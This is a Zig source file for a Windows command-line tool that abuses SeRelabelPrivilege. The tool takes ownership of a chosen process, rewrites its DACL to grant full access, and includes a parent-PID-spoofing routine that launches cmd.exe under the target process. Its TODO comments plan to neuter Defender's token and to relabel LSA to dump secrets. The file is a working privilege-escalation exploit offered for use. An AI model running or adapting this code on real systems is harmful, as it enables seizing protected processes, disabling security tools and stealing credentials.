// set log level by build type
pub const default_level: std.Level = switch (std.builtin.mode) {
    .Debug => .debug,
    .ReleaseSafe, .ReleaseFast, .ReleaseSmall => .info,
};

// TODO: relabel a process token and drop it to a low privlege (defenderslam)
// TODO: relabel LSA to dump secrets

const utility = @import("lib/utility.zig");

const std = @import("std");
const win32 = @import("win32").everything;

const Action = struct {
    const Self = @This();

    const Error = error{
        StringToLong,
        AccountNotFound,
        NoMemory,
        UnableToOpenPolicy,
    };

    privilege: std.AutoHashMap(u32, u32),
    enable: bool,
    show: bool,
    allocator: std.mem.Allocator,
    sid: *win32.SID,
    targetPID: u32,
    lpAccountName: [:0]u8,
    sourceProcessToken: ?win32.HANDLE,
    targetHandle: ?win32.HANDLE,

    targetDuplicateProcessToken: ?win32.HANDLE,
    targetProcessToken: ?win32.HANDLE,

    pub fn init(allocator: std.mem.Allocator) !Self {
        return Self{
            .privilege = std.AutoHashMap(u32, u32).init(allocator),
            .enable = true,
            .show = false,
            .allocator = allocator,
            .sid = undefined,
            .targetPID = undefined,
            .lpAccountName = undefined,
            .sourceProcessToken = null,
            .targetHandle = null,
            .targetDuplicateProcessToken = null,
            .targetProcessToken = null,
        };
    }

    fn takeProcessOwnership(pid: u32, ppSID: win32.PSID) !void {
        std.log.debug(("[+] takeProcessOwnership: OpenProcess({d})"), .{pid});

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        const hProc: ?win32.HANDLE = win32.OpenProcess(
            win32.PROCESS_WRITE_OWNER,
            0,
            pid,
        );
        if (hProc == null) {
            std.log.err("TakeProcessOwnership: OpenProcess GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }
        defer utility.closeHandle(hProc);

        var si: u32 = @bitCast(win32.OWNER_SECURITY_INFORMATION);
        si |= @bitCast(win32.LABEL_SECURITY_INFORMATION);

        var sida: ?win32.PSTR = null;
        // https://learn.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsidtostringsida
        if (0 == win32.ConvertSidToStringSidA(
            ppSID,
            &sida,
        )) {
            std.log.err("\t TakeProcessOwnership.ConvertSidToStringSidA:CopySid failed. GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.AccountNotFound;
        }
        defer _ = win32.LocalFree(@intCast(@intFromPtr(sida)));
        std.log.debug("TakeProcessOwnership.SID: {s}\n", .{sida.?});

        // https://learn.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-setsecurityinfo
        const dwRes: u32 = win32.SetSecurityInfo(
            hProc,
            win32.SE_KERNEL_OBJECT,
            si,
            ppSID,
            null,
            null,
            null,
        );

        if (dwRes != 0) {
            const err: win32.WIN32_ERROR = @enumFromInt(dwRes);
            std.log.err("TakeProcessOwnership: SetSecurityInfo dwRes: {any} GetLastError: {d}\n", .{ err, dwRes });
            return Error.AccountNotFound;
        }

        std.log.debug(("[+] takeProcessOwnership: SetSecurityInfo({d}) dwRes={d} GLE={d}"), .{ pid, dwRes, @intFromEnum(win32.GetLastError()) });
    }

    fn grantProcessFullControl(_: std.mem.Allocator, pid: u32, ppSID: win32.PSID) !void {
        var pOldDACL: ?*win32.ACL = null;
        var pNewDACL: ?*win32.ACL = null;
        var pSD: ?win32.PSECURITY_DESCRIPTOR = null;

        var da: u32 = @bitCast(win32.PROCESS_WRITE_DAC);
        da |= @bitCast(win32.PROCESS_READ_CONTROL);

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        const hProcess = win32.OpenProcess(
            @bitCast(da),
            0,
            pid,
        );

        if (hProcess == null) {
            std.log.err("[!] Failed OpenProcess :: null handle", .{});
            return Error.AccountNotFound;
        }
        defer utility.closeHandle(hProcess);

        std.log.debug(("[+] grantProcessFullControl: OpenProcess({d})"), .{pid});

        // https://learn.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-getsecurityinfo
        const dwRes = win32.GetSecurityInfo(
            hProcess.?,
            win32.SE_KERNEL_OBJECT,
            @bitCast(win32.DACL_SECURITY_INFORMATION),
            null,
            null,
            &pOldDACL,
            null,
            &pSD,
        );

        if (dwRes != win32.ERROR_SUCCESS) {
            std.log.err("[!] Failed GetSecurityInfo :: error code ({any})", .{dwRes});
            return Error.AccountNotFound;
        }
        defer _ = win32.LocalFree(@intCast(@intFromPtr(pSD)));

        std.log.debug(("[+] grantProcessFullControl: GetSecurityInfo({d})"), .{pid});

        var ea: win32.EXPLICIT_ACCESS_W = std.mem.zeroes(win32.EXPLICIT_ACCESS_W);

        ea.grfAccessPermissions = @bitCast(win32.PROCESS_ALL_ACCESS);
        ea.grfAccessMode = win32.GRANT_ACCESS;
        ea.grfInheritance = win32.NO_INHERITANCE;

        ea.Trustee.TrusteeForm = win32.TRUSTEE_IS_SID;
        ea.Trustee.TrusteeType = win32.TRUSTEE_IS_USER;

        ea.Trustee.ptstrName = @ptrCast(@alignCast(@constCast(ppSID)));

        // https://learn.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-setentriesinaclw
        var ret = win32.SetEntriesInAclW(
            1,
            @ptrCast(&ea),
            pOldDACL,
            &pNewDACL,
        );

        if (ret != @intFromEnum(win32.ERROR_SUCCESS)) {
            std.log.err("[!] Failed SetEntriesInAclW :: error code ({any})", .{ret});
            return Error.AccountNotFound;
        }
        defer _ = win32.LocalFree(@intCast(@intFromPtr(pNewDACL)));

        std.log.debug(("[+] grantProcessFullControl: SetEntriesInAclW({d})"), .{pid});

        // https://learn.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-setsecurityinfo
        ret = win32.SetSecurityInfo(
            hProcess,
            win32.SE_KERNEL_OBJECT,
            @bitCast(win32.DACL_SECURITY_INFORMATION),
            null,
            null,
            pNewDACL,
            null,
        );

        if (ret != @intFromEnum(win32.ERROR_SUCCESS)) {
            std.log.err("[!] Failed SetSecurityInfo :: error code ({any})", .{ret});
            return Error.AccountNotFound;
        }

        std.log.debug(("[+] grantProcessFullControl: SetSecurityInfo({d})"), .{pid});
    }

    pub fn attemptRelabel(self: *Self) !void {
        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
        const hProcess: ?win32.HANDLE = win32.GetCurrentProcess();
        defer utility.closeHandle(hProcess);

        if (hProcess == null) {
            std.log.debug("GetCurrentProcess failed", .{});
            return Action.Error.AccountNotFound;
        }

        if (!utility.tryEnablePrivilege(
            hProcess,
            win32.SE_RELABEL_NAME,
            &self.sourceProcessToken,
        )) {
            return error.UnableToOpenPolicy;
        }

        var ppSid = try utility.getProcessOwnerSID(self.allocator, self.sourceProcessToken);
        defer ppSid.deinit(self.allocator);

        takeProcessOwnership(self.targetPID, ppSid.sid()) catch |err| {
            std.log.err("Failed takeProcessOwnership {any}\n", .{err});
            return Action.Error.NoMemory;
        };

        std.log.debug("TakeProcessOwnership: Successfully took ownership of the process {d}\n", .{self.targetPID});

        grantProcessFullControl(self.allocator, self.targetPID, ppSid.sid()) catch |err| {
            std.log.err("attemptRelabel: Failed grantProcessFullControl {any}\n", .{err});
            return Action.Error.NoMemory;
        };

        std.log.debug("Successfully took full control of the process {d}\n", .{self.targetPID});
    }

    pub fn spawnProcessFromPID(self: *Self) !void {
        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        const hProc: ?win32.HANDLE = win32.OpenProcess(
            win32.PROCESS_CREATE_PROCESS,
            0,
            self.targetPID,
        );
        defer utility.closeHandle(hProc);

        if (hProc == null) {
            std.log.err("spawnProcessFromPID: OpenProcess GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }

        std.log.err("spawnProcessFromPID: OpenProcess GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});

        var processInformation: win32.PROCESS_INFORMATION = std.mem.zeroes(win32.PROCESS_INFORMATION);
        var startupInfo: win32.STARTUPINFOEXW = std.mem.zeroes(win32.STARTUPINFOEXW);
        var attributeSize: usize = 0;

        // get the required size ... ignore the error return - it's expected to "fail"
        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
        _ = win32.InitializeProcThreadAttributeList(
            null,
            1,
            0,
            &attributeSize,
        );

        // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-getprocessheap
        const hHeap = win32.GetProcessHeap();
        if (hHeap == null) {
            std.log.err("spawnProcessFromPID: GetProcessHeap GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }
        startupInfo.StartupInfo.cb = @sizeOf(win32.STARTUPINFOEXW);

        // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
        startupInfo.lpAttributeList = win32.HeapAlloc(
            hHeap,
            win32.HEAP_NONE,
            attributeSize,
        );
        // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapfree
        defer _ = win32.HeapFree(hHeap, win32.HEAP_NONE, startupInfo.lpAttributeList);

        if (startupInfo.lpAttributeList == null) {
            std.log.err("spawnProcessFromPID: Unable to allocate si.lpAttributeList", .{});
            return Error.AccountNotFound;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist
        if (0 == win32.InitializeProcThreadAttributeList(
            startupInfo.lpAttributeList,
            1,
            0,
            &attributeSize,
        )) {
            std.log.err("spawnProcessFromPID: InitializeProcThreadAttributeList GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
        if (0 == win32.UpdateProcThreadAttribute(
            startupInfo.lpAttributeList,
            0,
            win32.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            @ptrCast(@constCast(&hProc)),
            @sizeOf(win32.HANDLE),
            null,
            null,
        )) {
            std.log.err("spawnProcessFromPID: UpdateProcThreadAttribute GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }

        const cmd = "C:\\windows\\system32\\cmd.exe";
        const lpApplicationName = std.unicode.utf8ToUtf16LeAllocZ(self.allocator, cmd) catch undefined;
        errdefer self.allocator.free(lpApplicationName);

        const dwCreationFlags = win32.PROCESS_CREATION_FLAGS{
            .EXTENDED_STARTUPINFO_PRESENT = 1,
            .CREATE_NEW_CONSOLE = 1,
        };

        var lpProcessAttributes: win32.SECURITY_ATTRIBUTES = std.mem.zeroes(win32.SECURITY_ATTRIBUTES);
        lpProcessAttributes.nLength = @sizeOf(win32.SECURITY_ATTRIBUTES);

        var lpThreadAttributes: win32.SECURITY_ATTRIBUTES = std.mem.zeroes(win32.SECURITY_ATTRIBUTES);
        lpThreadAttributes.nLength = @sizeOf(win32.SECURITY_ATTRIBUTES);

        std.log.debug("[+] Attempting to create {s}\n", .{cmd});

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
        if (0 == win32.CreateProcessW(
            lpApplicationName,
            null,
            &lpProcessAttributes,
            &lpThreadAttributes,
            0,
            dwCreationFlags,
            null,
            null,
            @ptrCast(&startupInfo),
            &processInformation,
        )) {
            std.log.err("spawnProcessFromPID: CreateProcessA GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }

        std.log.debug("Process Created - PID: {d} - GLE: {d}", .{ processInformation.dwProcessId, @intFromEnum(win32.GetLastError()) });

        // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
        if (win32.WaitForSingleObject(
            processInformation.hProcess,
            win32.INFINITE,
        ) == @intFromEnum(win32.WAIT_FAILED)) {
            std.log.err("spawnProcessFromPID: WaitForSingleObject GetLastError: {d}\n", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }

        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-deleteprocthreadattributelist
        win32.DeleteProcThreadAttributeList(
            startupInfo.lpAttributeList,
        );

        defer utility.closeHandle(processInformation.hProcess);
        defer utility.closeHandle(processInformation.hThread);
    }

    fn showProcessSecurity(pid: u32) !void {
        var pSD: ?win32.PSECURITY_DESCRIPTOR = null;
        var pOwnerSid: ?win32.PSID = null;
        var pDacl: ?*win32.ACL = null;

        var da: u32 = @bitCast(win32.PROCESS_QUERY_INFORMATION);
        da |= @bitCast(win32.PROCESS_READ_CONTROL);

        const hProcess = win32.OpenProcess(@bitCast(da), 0, pid);
        if (hProcess == null) {
            std.log.err("[!] showProcessSecurity: OpenProcess failed GLE: {d}", .{@intFromEnum(win32.GetLastError())});
            return Error.UnableToOpenPolicy;
        }
        defer utility.closeHandle(hProcess);

        // https://learn.microsoft.com/en-us/windows/win32/api/aclapi/nf-aclapi-getsecurityinfo
        const dwRes = win32.GetSecurityInfo(
            hProcess.?,
            win32.SE_KERNEL_OBJECT,
            @bitCast(win32.OBJECT_SECURITY_INFORMATION{
                .OWNER_SECURITY_INFORMATION = 1,
                .DACL_SECURITY_INFORMATION = 1,
                .LABEL_SECURITY_INFORMATION = 1,
            }),
            &pOwnerSid,
            null,
            &pDacl,
            null,
            &pSD,
        );
        if (dwRes != win32.ERROR_SUCCESS) {
            std.log.err("[!] showProcessSecurity: GetSecurityInfo failed GLE: {d}", .{@intFromEnum(win32.GetLastError())});
            return Error.AccountNotFound;
        }
        defer _ = win32.LocalFree(@intCast(@intFromPtr(pSD)));

        var ownerStr: ?win32.PSTR = null;
        if (0 != win32.ConvertSidToStringSidA(pOwnerSid, &ownerStr)) {
            defer _ = win32.LocalFree(@intCast(@intFromPtr(ownerStr)));
            std.log.info("[+] PID {d} Owner SID : {s}", .{ pid, ownerStr.? });
        } else {
            std.log.err("[!] ConvertSidToStringSidA failed GLE: {d}", .{@intFromEnum(win32.GetLastError())});
        }

        var sddlStr: ?win32.PSTR = null;
        var sddlLen: u32 = 0;
        if (0 != win32.ConvertSecurityDescriptorToStringSecurityDescriptorA(
            pSD.?,
            win32.SDDL_REVISION_1,
            @bitCast(win32.OBJECT_SECURITY_INFORMATION{
                .OWNER_SECURITY_INFORMATION = 1,
                .DACL_SECURITY_INFORMATION = 1,
                .LABEL_SECURITY_INFORMATION = 1,
            }),
            &sddlStr,
            &sddlLen,
        )) {
            defer _ = win32.LocalFree(@intCast(@intFromPtr(sddlStr)));
            std.log.info("[+] PID {d} SDDL      : {s}", .{ pid, sddlStr.? });
        } else {
            std.log.err("[!] ConvertSecurityDescriptorToStringSecurityDescriptorA failed GLE: {d}", .{@intFromEnum(win32.GetLastError())});
        }

        if (pDacl) |dacl| {
            var aclInfo: win32.ACL_SIZE_INFORMATION = std.mem.zeroes(win32.ACL_SIZE_INFORMATION);
            if (0 != win32.GetAclInformation(
                dacl,
                &aclInfo,
                @sizeOf(win32.ACL_SIZE_INFORMATION),
                win32.AclSizeInformation,
            )) {
                std.log.info("[+] PID {d} DACL ACE count: {d}", .{ pid, aclInfo.AceCount });
                var i: u32 = 0;
                while (i < aclInfo.AceCount) : (i += 1) {
                    var pAce: ?*anyopaque = null;
                    if (0 != win32.GetAce(dacl, i, &pAce)) {
                        const header: *win32.ACE_HEADER = @ptrCast(@alignCast(pAce.?));

                        if (header.AceType == 0) {
                            const ace: *win32.ACCESS_ALLOWED_ACE = @ptrCast(@alignCast(pAce.?));
                            var aceStr: ?win32.PSTR = null;
                            if (0 != win32.ConvertSidToStringSidA(@ptrCast(&ace.SidStart), &aceStr)) {
                                defer _ = win32.LocalFree(@intCast(@intFromPtr(aceStr)));
                                std.log.info("    ACE[{d}] ALLOW mask=0x{x:0>8} SID={s}", .{ i, ace.Mask, aceStr.? });
                            }
                        } else {
                            std.log.info("    ACE[{d}] type={d} (not ACCESS_ALLOWED)", .{ i, header.AceType });
                        }
                    }
                }
            }
        }
    }

    pub fn debug(self: *Self) void {
        std.log.info("Relabel Targets PID: {d}", .{self.targetPID});
    }

    pub fn parseUsername(self: *Self, line: [:0]const u8) !void {
        self.lpAccountName = try std.fmt.allocPrintSentinel(self.allocator, "{s}", .{line}, 0);
        errdefer self.allocator.free(self.lpAccountName);
    }

    pub fn parsePID(self: *Self, line: [:0]const u8) !void {
        self.targetPID = try std.fmt.parseInt(u32, line, 10);
    }

    pub fn deinit(self: *Self) void {
        defer self.allocator.free(self.lpAccountName);
    }
};

pub fn usage(
    allocator: std.mem.Allocator,
    io: std.Io,
    argv: [:0]const u8,
) !void {
    const buffer: []u8 = try std.fmt.allocPrint(allocator,
        \\  This tool exist thanks to https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/
        \\
        \\Example:
        \\
        \\ Attempt to set ownership of PID for the user 'pete':
        \\ .\\{s} pete 1969
        \\
        \\ Attempt to show ownership of PID:
        \\ .\\{s} -show 1969
        \\
        \\ Show this menu
        \\ .\\{s} -h
        \\
    , .{ argv, argv, argv });

    try std.Io.File.stdout().writeStreamingAll(io, buffer);

    std.process.exit(0);
}

pub fn main(init: std.process.Init) !void {
    var gpa = std.heap.DebugAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    const args = try init.minimal.args.toSlice(init.arena.allocator());

    if (args.len != 3) {
        try usage(allocator, init.io, args[0]);
    }

    var action = try Action.init(allocator);
    defer action.deinit();

    var i: u8 = 0;

    for (args) |arg| {
        if (std.mem.containsAtLeast(u8, arg, 1, "-show")) {
            action.show = true;
        }

        if (i == 1) {
            try action.parseUsername(arg);
        }

        if (i == 2) {
            try action.parsePID(arg);
        }

        i += 1;
    }

    action.debug();

    if (action.show) {
        try Action.showProcessSecurity(action.targetPID);
    } else {
        try action.attemptRelabel();
    }

    // try action.spawnProcessFromPID();

    std.log.info("[+] Done", .{});

    std.process.exit(0);
}
